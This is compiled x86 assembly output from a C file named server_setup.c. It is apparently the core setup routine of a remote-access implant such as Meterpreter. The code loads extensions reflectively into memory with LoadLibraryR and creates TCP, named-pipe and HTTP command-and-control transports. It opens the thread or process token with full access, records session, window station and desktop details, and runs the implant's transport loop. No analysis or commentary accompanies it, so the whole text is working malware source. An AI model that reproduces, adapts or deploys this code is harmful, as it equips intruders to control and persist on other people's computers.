	.file	"server_setup.c"
	.text
	.def	_time;	.scl	3;	.type	32;	.endef
_time:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___time32, %eax
	call	*%eax
	leave
	ret
	.globl	_exceptionfilter
	.def	_exceptionfilter;	.scl	2;	.type	32;	.endef
_exceptionfilter:
	pushl	%ebp
	movl	%esp, %ebp
	movl	$1, %eax
	popl	%ebp
	ret
	.section .rdata,"dr"
LC0:
	.ascii "kernel32.dll\0"
LC1:
	.ascii "ProcessIdToSessionId\0"
	.text
	.globl	_server_sessionid
	.def	_server_sessionid;	.scl	2;	.type	32;	.endef
_server_sessionid:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$36, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	_processIdToSessionId.83546, %eax
	testl	%eax, %eax
	jne	L6
	movl	$LC0, (%esp)
	movl	__imp__LoadLibraryA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L6
	movl	$LC1, 4(%esp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetProcAddress@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	%eax, _processIdToSessionId.83546
L6:
	movl	_processIdToSessionId.83546, %eax
	testl	%eax, %eax
	je	L11
	movl	_processIdToSessionId.83546, %ebx
	movl	__imp__GetCurrentProcessId@0, %eax
	call	*%eax
	leal	-16(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	*%ebx
	subl	$8, %esp
	testl	%eax, %eax
	jne	L8
	movl	$-1, -16(%ebp)
	jmp	L8
L11:
	nop
L8:
	cmpl	$0, -12(%ebp)
	je	L9
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__FreeLibrary@4, %eax
	call	*%eax
	subl	$4, %esp
L9:
	movl	-16(%ebp), %eax
	movl	-4(%ebp), %ebx
	leave
	ret
	.globl	_load_stageless_extensions
	.def	_load_stageless_extensions;	.scl	2;	.type	32;	.endef
_load_stageless_extensions:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	jmp	L13
L14:
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	movl	12(%ebp), %edx
	addl	$4, %edx
	movl	$1, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_LoadLibraryR@12
	subl	$12, %esp
	movl	%eax, -32(%ebp)
	movl	_extensionCommands, %eax
	movl	%eax, 16(%esp)
	movl	$0, 12(%esp)
	movl	8(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$1, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_load_extension
	movl	12(%ebp), %eax
	leal	4(%eax), %edx
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	addl	%edx, %eax
	movl	%eax, 12(%ebp)
L13:
	movl	12(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L14
	movl	12(%ebp), %eax
	addl	$4, %eax
	movl	%eax, -12(%ebp)
	jmp	L15
L16:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	%eax, -16(%ebp)
	movl	-12(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	$8, -24(%ebp)
	movl	-12(%ebp), %edx
	movl	-24(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -28(%ebp)
	movl	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-28(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_stagelessinit_extension
	movl	-28(%ebp), %edx
	movl	-20(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
L15:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$-1, %eax
	jne	L16
	movl	-12(%ebp), %eax
	addl	$4, %eax
	leave
	ret
	.section .rdata,"dr"
	.align 2
LC2:
	.ascii "t\0c\0p\0\0\0"
	.align 2
LC3:
	.ascii "p\0i\0p\0e\0\0\0"
	.text
	.def	_create_transport;	.scl	3;	.type	32;	.endef
_create_transport:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	$3, 8(%esp)
	movl	$LC2, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	jne	L19
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_create_tcp
	movl	%eax, -12(%ebp)
	jmp	L20
L19:
	movl	12(%ebp), %eax
	movl	$4, 8(%esp)
	movl	$LC3, 4(%esp)
	movl	%eax, (%esp)
	call	_wcsncmp
	testl	%eax, %eax
	jne	L21
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_create_named_pipe
	movl	%eax, -12(%ebp)
	jmp	L20
L21:
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_create_http
	movl	%eax, -12(%ebp)
L20:
	cmpl	$0, -12(%ebp)
	jne	L22
	movl	$0, %eax
	jmp	L23
L22:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L24
	movl	-12(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 72(%eax)
	movl	-12(%ebp), %eax
	movl	72(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 4(%eax)
	jmp	L25
L24:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 72(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %edx
	movl	-12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	72(%eax), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 72(%eax)
L25:
	movl	-12(%ebp), %eax
L23:
	leave
	ret
	.def	_append_transport;	.scl	3;	.type	32;	.endef
_append_transport:
	pushl	%ebp
	movl	%esp, %ebp
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	testl	%eax, %eax
	jne	L27
	movl	12(%ebp), %eax
	movl	12(%ebp), %edx
	movl	%edx, 72(%eax)
	movl	12(%ebp), %eax
	movl	72(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%eax)
	jmp	L29
L27:
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	72(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 72(%eax)
	movl	8(%ebp), %eax
	movl	(%eax), %edx
	movl	12(%ebp), %eax
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	72(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, 68(%eax)
	movl	8(%ebp), %eax
	movl	(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, 72(%eax)
L29:
	nop
	popl	%ebp
	ret
	.def	_remove_transport;	.scl	3;	.type	32;	.endef
_remove_transport:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	cmpl	%eax, %edx
	jne	L31
	movl	8(%ebp), %eax
	movl	$0, 4(%eax)
	jmp	L32
L31:
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	cmpl	%eax, 12(%ebp)
	jne	L33
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	8(%ebp), %eax
	movl	%edx, 4(%eax)
L33:
	movl	12(%ebp), %eax
	movl	72(%eax), %eax
	movl	12(%ebp), %edx
	movl	68(%edx), %edx
	movl	%edx, 68(%eax)
	movl	12(%ebp), %eax
	movl	68(%eax), %eax
	movl	12(%ebp), %edx
	movl	72(%edx), %edx
	movl	%edx, 72(%eax)
L32:
	movl	12(%ebp), %eax
	movl	28(%eax), %eax
	movl	12(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	nop
	leave
	ret
	.def	_create_transports;	.scl	3;	.type	32;	.endef
_create_transports:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$0, -12(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, -16(%ebp)
	jmp	L35
L38:
	leal	-20(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_transport
	testl	%eax, %eax
	je	L36
	movl	-20(%ebp), %eax
	addl	%eax, -12(%ebp)
	movl	-20(%ebp), %eax
	addl	%eax, -16(%ebp)
	jmp	L35
L36:
	movl	$0, %eax
	jmp	L37
L35:
	movl	-16(%ebp), %eax
	movzwl	(%eax), %eax
	testw	%ax, %ax
	jne	L38
	movl	-12(%ebp), %eax
	leal	2(%eax), %edx
	movl	16(%ebp), %eax
	movl	%edx, (%eax)
	movl	$1, %eax
L37:
	leave
	ret
	.def	_config_create;	.scl	3;	.type	32;	.endef
_config_create:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$52, %esp
	movl	$48, -12(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, -16(%ebp)
	movl	-12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	cmpl	$0, 12(%ebp)
	jne	L40
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	addl	$16, %eax
	jmp	L41
L40:
	movl	12(%ebp), %eax
L41:
	movl	-16(%ebp), %edx
	addl	$16, %edx
	movl	$16, 8(%esp)
	movl	%eax, 4(%esp)
	movl	%edx, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	16(%eax), %eax
	leal	32(%eax), %edx
	movl	-16(%ebp), %eax
	addl	$32, %eax
	movl	$16, 8(%esp)
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_memcpy
	movl	8(%ebp), %eax
	movl	72(%eax), %ebx
	call	_current_unix_timestamp
	subl	%eax, %ebx
	movl	%ebx, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 12(%eax)
	movl	-16(%ebp), %eax
	movl	$170532320, 8(%eax)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -24(%ebp)
	movl	8(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, -20(%ebp)
L47:
	movl	-20(%ebp), %eax
	movl	12(%eax), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -28(%ebp)
	movl	-12(%ebp), %edx
	movl	-28(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_realloc
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-28(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	-32(%ebp), %eax
	movl	%eax, (%esp)
	call	_memset
	movl	-28(%ebp), %eax
	addl	%eax, -12(%ebp)
	movl	-20(%ebp), %eax
	cmpl	-24(%ebp), %eax
	jne	L42
	movl	-20(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	je	L42
	movl	-20(%ebp), %eax
	movl	4(%eax), %eax
	movl	-20(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	-16(%ebp), %edx
	movl	%eax, (%edx)
L42:
	movl	-20(%ebp), %eax
	movl	(%eax), %eax
	cmpl	$8, %eax
	je	L43
	cmpl	$8, %eax
	ja	L44
	cmpl	$6, %eax
	je	L45
	cmpl	$6, %eax
	ja	L44
	cmpl	$1, %eax
	je	L46
	cmpl	$2, %eax
	je	L45
	jmp	L44
L46:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_write_tcp_config
	jmp	L44
L43:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_write_named_pipe_config
	jmp	L44
L45:
	movl	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, (%esp)
	call	_transport_write_http_config
	nop
L44:
	movl	-20(%ebp), %eax
	movl	68(%eax), %eax
	movl	%eax, -20(%ebp)
	movl	-20(%ebp), %eax
	cmpl	-24(%ebp), %eax
	jne	L47
	movl	$10, -36(%ebp)
	movl	-12(%ebp), %edx
	movl	-36(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_realloc
	movl	%eax, -16(%ebp)
	movl	-16(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%eax, %edx
	movl	-36(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$255, 4(%esp)
	movl	%edx, (%esp)
	call	_memset
	movl	-36(%ebp), %eax
	leal	-4(%eax), %edx
	movl	-16(%ebp), %ecx
	movl	-12(%ebp), %eax
	addl	%ecx, %eax
	movl	%edx, 8(%esp)
	movl	$0, 4(%esp)
	movl	%eax, (%esp)
	call	_memset
	movl	-36(%ebp), %eax
	addl	%eax, -12(%ebp)
	movl	20(%ebp), %eax
	movl	-12(%ebp), %edx
	movl	%edx, (%eax)
	movl	16(%ebp), %eax
	movl	-16(%ebp), %edx
	movl	%edx, (%eax)
	nop
	addl	$52, %esp
	popl	%ebx
	popl	%ebp
	ret
	.globl	_server_setup
	.def	_server_setup;	.scl	2;	.type	32;	.endef
_server_setup:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%edi
	pushl	%ebx
	subl	$576, %esp
	movl	$0, -12(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -288(%ebp)
	leal	-284(%ebp), %edx
	movl	$0, %eax
	movl	$63, %ecx
	movl	%edx, %edi
	rep stosl
	movl	$0, -544(%ebp)
	leal	-540(%ebp), %edx
	movl	$0, %eax
	movl	$63, %ecx
	movl	%edx, %edi
	rep stosl
	movl	$0, -20(%ebp)
	call	_disable_thread_error_reporting
	movl	$0, (%esp)
	call	_time
	movl	%eax, (%esp)
	call	_srand
	call	_thread_open
	movl	%eax, -12(%ebp)
	call	_remote_allocate
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	jne	L49
	movl	$8, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L69
L49:
	movl	8(%ebp), %eax
	movl	12(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 68(%eax)
	call	_current_unix_timestamp
	movl	-16(%ebp), %edx
	movl	%eax, 76(%edx)
	movl	-16(%ebp), %eax
	movl	76(%eax), %edx
	movl	8(%ebp), %eax
	movl	12(%eax), %eax
	addl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 72(%eax)
	movl	$0, -548(%ebp)
	movl	8(%ebp), %eax
	leal	48(%eax), %edx
	leal	-548(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	%edx, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_create_transports
	testl	%eax, %eax
	jne	L51
	movl	$160, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L69
L51:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L52
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	8(%eax), %eax
	movl	8(%ebp), %edx
	movl	(%edx), %ecx
	movl	-16(%ebp), %edx
	movl	4(%edx), %edx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
L52:
	movl	-16(%ebp), %eax
	movl	$_create_transport, 60(%eax)
	movl	-16(%ebp), %eax
	movl	$_remove_transport, 64(%eax)
	movl	-16(%ebp), %eax
	movl	$_config_create, (%eax)
	movl	-12(%ebp), %eax
	movl	4(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 24(%eax)
	call	_register_dispatch_routines
	movl	8(%ebp), %eax
	leal	48(%eax), %edx
	movl	-548(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_load_stageless_extensions
	movl	%eax, -24(%ebp)
	movl	-24(%ebp), %edx
	movl	8(%ebp), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	movl	%eax, -28(%ebp)
	movl	-28(%ebp), %eax
	movl	%eax, (%esp)
	call	_malloc
	movl	%eax, %edx
	movl	-16(%ebp), %eax
	movl	%edx, 16(%eax)
	movl	-16(%ebp), %eax
	movl	16(%eax), %eax
	movl	-28(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	8(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__memcpy_s, %eax
	call	*%eax
	movl	-16(%ebp), %eax
	leal	28(%eax), %edx
	movl	-16(%ebp), %eax
	movl	24(%eax), %eax
	movl	%edx, 12(%esp)
	movl	$1, 8(%esp)
	movl	$983551, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__OpenThreadToken@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	jne	L53
	movl	-16(%ebp), %eax
	leal	28(%eax), %ebx
	movl	__imp__GetCurrentProcess@0, %eax
	call	*%eax
	movl	%ebx, 8(%esp)
	movl	$983551, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__OpenProcessToken@12, %eax
	call	*%eax
	subl	$12, %esp
L53:
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_scheduler_initialize
	testl	%eax, %eax
	je	L54
	movl	$10, (%esp)
	movl	__imp__SetLastError@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L69
L54:
	movl	-16(%ebp), %eax
	movl	28(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 32(%eax)
	call	_server_sessionid
	movl	-16(%ebp), %edx
	movl	%eax, 36(%edx)
	movl	-16(%ebp), %eax
	movl	36(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 40(%eax)
	movl	__imp__GetProcessWindowStation@0, %eax
	call	*%eax
	movl	$0, 16(%esp)
	movl	$256, 12(%esp)
	leal	-288(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetUserObjectInformationA@20, %eax
	call	*%eax
	subl	$20, %esp
	leal	-288(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-16(%ebp), %edx
	movl	%eax, 44(%edx)
	leal	-288(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-16(%ebp), %edx
	movl	%eax, 48(%edx)
	movl	__imp__GetCurrentThreadId@0, %eax
	call	*%eax
	movl	%eax, (%esp)
	movl	__imp__GetThreadDesktop@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	$0, 16(%esp)
	movl	$256, 12(%esp)
	leal	-544(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	$2, 4(%esp)
	movl	%eax, (%esp)
	movl	__imp__GetUserObjectInformationA@20, %eax
	call	*%eax
	subl	$20, %esp
	leal	-544(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-16(%ebp), %edx
	movl	%eax, 52(%edx)
	leal	-544(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp___strdup, %eax
	call	*%eax
	movl	-16(%ebp), %edx
	movl	%eax, 56(%edx)
	call	_current_unix_timestamp
	movl	-16(%ebp), %edx
	movl	%eax, 76(%edx)
	jmp	L55
L66:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	20(%eax), %eax
	testl	%eax, %eax
	je	L56
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	20(%eax), %eax
	movl	-16(%ebp), %edx
	movl	4(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
	testl	%eax, %eax
	je	L56
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 4(%eax)
	jmp	L55
L56:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	32(%eax), %eax
	movl	-12(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	-16(%ebp), %edx
	movl	%edx, (%esp)
	call	*%eax
	movl	%eax, -32(%ebp)
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	24(%eax), %eax
	testl	%eax, %eax
	je	L57
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	24(%eax), %eax
	movl	-16(%ebp), %edx
	movl	4(%edx), %edx
	movl	%edx, (%esp)
	call	*%eax
L57:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	16(%eax), %eax
	testl	%eax, %eax
	je	L58
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	16(%eax), %eax
	cmpl	$0, -32(%ebp)
	jne	L59
	movl	-16(%ebp), %edx
	movl	8(%edx), %edx
	testl	%edx, %edx
	jne	L59
	movl	$1, %ecx
	jmp	L60
L59:
	movl	$0, %ecx
L60:
	movl	-16(%ebp), %edx
	movl	4(%edx), %edx
	movl	%ecx, 4(%esp)
	movl	%edx, (%esp)
	call	*%eax
L58:
	cmpl	$0, -32(%ebp)
	jne	L61
	movl	-16(%ebp), %eax
	movl	8(%eax), %eax
	testl	%eax, %eax
	je	L71
	movl	-16(%ebp), %eax
	movl	8(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 4(%eax)
	movl	-16(%ebp), %eax
	movl	$0, 8(%eax)
	jmp	L64
L61:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	68(%eax), %edx
	movl	-16(%ebp), %eax
	movl	%edx, 4(%eax)
L64:
	movl	-16(%ebp), %eax
	movl	12(%eax), %eax
	testl	%eax, %eax
	je	L65
	movl	-16(%ebp), %eax
	movl	12(%eax), %eax
	movl	%eax, (%esp)
	call	_sleep
	movl	-16(%ebp), %eax
	movl	$0, 12(%eax)
L65:
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_free_encryption_context
L55:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L66
	jmp	L67
L71:
	nop
	jmp	L67
L68:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	movl	%eax, 4(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_remove_transport
L67:
	movl	-16(%ebp), %eax
	movl	4(%eax), %eax
	testl	%eax, %eax
	jne	L68
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_deregister_dispatch_routines
L69:
	call	_scheduler_destroy
	call	_command_join_threads
	movl	-16(%ebp), %eax
	movl	%eax, (%esp)
	call	_remote_deallocate
	movl	-20(%ebp), %eax
	leal	-8(%ebp), %esp
	popl	%ebx
	popl	%edi
	popl	%ebp
	ret
.lcomm _processIdToSessionId.83546,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
	.def	_load_extension;	.scl	2;	.type	32;	.endef
	.def	_stagelessinit_extension;	.scl	2;	.type	32;	.endef
	.def	_wcsncmp;	.scl	2;	.type	32;	.endef
	.def	_transport_create_tcp;	.scl	2;	.type	32;	.endef
	.def	_transport_create_named_pipe;	.scl	2;	.type	32;	.endef
	.def	_transport_create_http;	.scl	2;	.type	32;	.endef
	.def	_malloc;	.scl	2;	.type	32;	.endef
	.def	_memset;	.scl	2;	.type	32;	.endef
	.def	_memcpy;	.scl	2;	.type	32;	.endef
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
	.def	_realloc;	.scl	2;	.type	32;	.endef
	.def	_transport_write_tcp_config;	.scl	2;	.type	32;	.endef
	.def	_transport_write_named_pipe_config;	.scl	2;	.type	32;	.endef
	.def	_transport_write_http_config;	.scl	2;	.type	32;	.endef
	.def	_disable_thread_error_reporting;	.scl	2;	.type	32;	.endef
	.def	_srand;	.scl	2;	.type	32;	.endef
	.def	_thread_open;	.scl	2;	.type	32;	.endef
	.def	_remote_allocate;	.scl	2;	.type	32;	.endef
	.def	_register_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_scheduler_initialize;	.scl	2;	.type	32;	.endef
	.def	_sleep;	.scl	2;	.type	32;	.endef
	.def	_free_encryption_context;	.scl	2;	.type	32;	.endef
	.def	_deregister_dispatch_routines;	.scl	2;	.type	32;	.endef
	.def	_scheduler_destroy;	.scl	2;	.type	32;	.endef
	.def	_command_join_threads;	.scl	2;	.type	32;	.endef
	.def	_remote_deallocate;	.scl	2;	.type	32;	.endef
